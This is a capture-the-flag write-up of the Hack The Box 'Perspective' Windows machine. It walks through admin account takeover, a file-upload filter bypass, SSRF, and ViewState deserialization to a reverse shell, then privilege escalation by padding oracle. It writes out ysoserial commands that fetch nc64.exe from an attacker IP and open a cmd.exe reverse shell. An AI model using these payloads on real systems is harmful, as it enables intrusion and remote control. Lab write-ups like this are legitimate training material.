---
draft: false
news_post: false
author:
  - paul-knight
title: HTB Writeup - Perspective
date: 2022-10-19T14:06:14.308Z
usePageBundles: true
featureImage: images/perspective.png
thumbnail: images/perspective.png
shareImage: images/perspective.png
codeLineNumbers: true
codeMaxLines: 10
figurePositionShow: true
showRelatedInArticle: true
tags:
  - Application Security
  - Vulnerabilities
categories:
  - Education & Training
series:
  - hack the box
---
Perspective is an insane difficulty Windows machine that focuses on the exploitation of ASP.NET web applications and badly implemented cryptography. Initial access is obtained by reading the application web.config file via a Server-Side Include, which is possible due to a weak filter on file upload. Having retrieved the application machineKey , a new session cookie can be forged to gain administrative rights and access a restricted area, where SSRF can be exploited to access an internal encryption API which uses a weak RC4 implementation, resulting in the decryption of the ViewStateUserKey . Remote command execution is then achieved via deserialization of a malicious ViewState that can be forged using the obtained application keys. Finally, a padding oracle attack on an internal staging application running with administrative privileges allows to inject OS commands in an encrypted POST parameter, resulting in the elevation of privileges.

## **Information Gathering on Perspective Machine**

Once we have started the VPN connection which requires a download from Hackthebox, we can start information gathering on the machine by executing the command **nmap -sC -sV -p- <IP Address> -PN**

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.36.35-1024x542.png)

Let’s try to access the website interface

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.37.16-1024x137.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.37.45-1024x439.png)

The website is redirecting to a domain name

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.38.51-1024x507.png)

Look like there’s nothing that we can play unless we register a new account here. Therefore, let’s enumerate it using gobuster

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.39.36-1024x643.png)

Not much information that we can play around expect for /default and /Default Directory

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.39.22-1024x487.png)

Sadly, it’s the same page when we try to access the default directory

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.39.49-1024x552.png)

Let’s try to register by creating a new account

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.40.09-1024x534.png)

As a result, we should be able to register as normal

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.41.37-1024x531.png)

Therefore, let’s try to login via credentials that we created previously

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.42.05-1024x540.png)

At last, we managed to access the Dashboard where i notice there only have two functions such as “New Products” and “Support”

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.42.16-1024x459.png)

Inside the “New Product”, There are only details on the product and also one button to click which is “New Product”

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.42.25-1024x282.png)

On the other hand, we managed to sight a new email “admin@perspective.htb” which we might be able to take advantage on a later stage.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.46.15-1024x558.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.46.28-1024x559.png)

We also can see the response from the burpsuite request

## Forgot Password Vulnerability

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.47.54-1024x303.png)

As been mentioned on the header above, we can click the forget password button and check on the valid account which “admin@perspective.htb”

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.47.47-1024x560.png)

The screenshot above is the request and response via burpsuite

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.48.18-1024x359.png)

Sadly, the account of “admin” users cannot reset the password at all. Therefore, we need to change our method where we request the password on our valid account and modify the “admin@perspective.htb” account

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.46.15-1-1024x558.png)

The request above come from our valid account

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.52.42-1024x349.png)

We need to change the email address to admin@perspective.htb and click the forward button

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.55.28-1024x494.png)

As for the security question, we can enter a blank answer for all questions.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.53.03-1024x466.png)

As a result, we can change the password to our own password for the admin account

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.53.24-1024x329.png)

The screenshot above shows how it looks like on burpsuite

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.53.37-1024x481.png)

Finally, we have successfully changed the password for the admin’s account

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.54.00-1024x486.png)

Let’s try to access the admin’s account by entering the credentials that we modified earlier.

## Administrator’s Dashboard for the NPRS

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.54.09-1024x498.png)

At last, we managed to access the NPRS’s administrator dashboard which we can see in the screenshot above.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.57.52-1024x321.png)

As shown in the screenshot, the username “darknite” is not valid when we try to enter it on the column

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.58.03-1024x262.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.58.25-1024x466.png)

After we enter the full email on the column and we managed to download the pdf file from the website.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.58.44-1024x351.png)

However, we got a pdf that contains no details for the product

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-03-at-19.59.43-1024x555.png)

As a result, let’s try to upload a file that uses shtml file extension.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-14.20.54-1024x216.png)

Inside the stml file, there should contain a content such as shown above.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-14.21.19-1024x474.png)

Sadly, the system only accepting a JPEG file extension which we can try to bypass it

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-14.22.15-1024x484.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-14.22.39-1024x481.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-14.38.50-1024x496.png)

We should be able to change the content-type into the jpeg file extension.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-14.39.04-1024x326.png)

Therefore, we have successfully inserted the fill-up into the system

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-14.39.55-1024x467.png)

As a result, let’s try to download the pdf file

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-14.40.12-1024x390.png)

Finally, the pdf file contains some information that we created earlier.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-14.41.30-1024x438.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-14.48.13-1024x446.png)

The screenshot above show the response on burpsuite

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-15.05.14-1024x490.png)

Another screenshot that shows above on the browser version.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-18.39.54-1024x68.png)

Therefore, let’s create a file that contains some iframe code

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-18.30.53-1024x147.png)

We should be running the python server by running the command “python3 -m http.server”

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-18.31.24-1024x533.png)

We can retrieve the file on browser which we can put it on Description column

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-18.36.43-1024x432.png)

Oh wow! it works like a charm

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-18.38.23-1024x181.png)

On the python server terminal, it shows that the file has been sent to the request.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-18.38.30-1024x502.png)

Let’s download it again

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-18.38.41-1024x502.png)

We have obtained some information on AdminAPI swagger so we can modify the file darknite.html again so that we can retrieve it back on pdf

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-18.40.22-1024x550.png)

We got some information on the API parameter

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-18.48.59-1024x489.png)

As a result, we got a token for it.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-19.23.19-1024x538.png)

In this step, we are required to run ysoserial command to proceed with the further escalation process.

```shell
 -p ViewState -g TextFormattingRunProperties -c "powershell -c Invoke-webrequest -URI 10.10.14.18/nc64.exe -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe" --generator=0414C274 --validationalg="SHA1" --viewstateuserkey="SAltysAltYV1ewSTaT3" --validationkey="99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF"

-p ViewState -g TextFormattingRunProperties -c "C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd.exe 10.10.14.18 443" --generator=0414C274 --validationalg="SHA1" --viewstateuserkey="SAltysAltYV1ewSTaT3" --validationkey="99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF"
```

The command above will ensure you guys retrieve a reverse shell on the netcat terminal

## Obtain a reverse shell as Webuser on the Perspective machine

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-19.30.26-1024x194.png)

Finally, we managed to obtain a reverse shell on the machine itself.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-19.30.47-1024x687.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-19.30.55-1024x182.png)

We can read the user flag by typing the “type user.txt” command

## Escalate to Root Privileges Access

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-19.31.09-1024x1012.png)

We managed to see the .ssh directory on the Webuser’s directory

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-19.31.53-1024x628.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-19.32.01-1006x1024.png)

We can copy-paste the ssh id_rsa from the machine to our attacker’s machine.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-19.32.40-1024x1021.png)

I notice that the machine is listening to port 8009 for some reason.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-06-11-at-19.33.44-1024x99.png)

As a result, let’s do the port forwarding on that port for the machine itself.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-19.57.48-1024x725.png)

I also notice that there’s a sqladmin user on the machine but it’s a dead-end on that.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-19.58.18-1024x704.png)

There’s some directory in the user itself.

## Oracle Padding Attack on Perspective machine

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-20.26.29-1024x286.png)

We can take advantage of the Oracle Padding Attack by taking advantage of padbuster tool

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-20.34.17-1024x443.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-20.40.54-1024x668.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-20.52.36-1024x433.png)

After a while, we managed to see the result of the basic padbuster token

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-20.54.45-1024x172.png)

Let’s start our nc listener on our attacker’s machine

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-20.56.14-1024x655.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-21.33.02-1024x221.png)

As default, we have managed to obtain an encrypted value that we can use in the latter stage.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-21.36.07-1024x166.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-21.33.23-1024x658.png)

We should be replacing the old token with the new token that we obtained earlier.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-21.37.33-1024x264.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-21.37.38.png)

At last, we managed to retrieve root reverse shell connection back to us.

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-21.38.34-1024x839.png)

![](https://threatninja.net/wp-content/uploads/2022/10/Screenshot-2022-10-16-at-21.38.43-1024x224.png)

We can read the root flag by typing on the “type root.txt” command